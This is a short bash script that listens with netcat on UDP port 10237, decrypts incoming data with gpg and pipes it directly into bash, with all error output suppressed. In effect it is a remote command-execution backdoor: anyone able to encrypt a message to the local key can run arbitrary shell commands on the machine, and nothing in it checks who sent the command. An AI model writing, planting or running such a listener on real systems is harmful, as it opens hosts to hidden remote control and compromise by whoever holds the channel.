#!/bin/env bash
nc -vulnz -p 10237 2>/dev/null | gpg --homedir ./gnupg -d --allow-multiple-messages 2>/dev/null | /usr/bin/bash
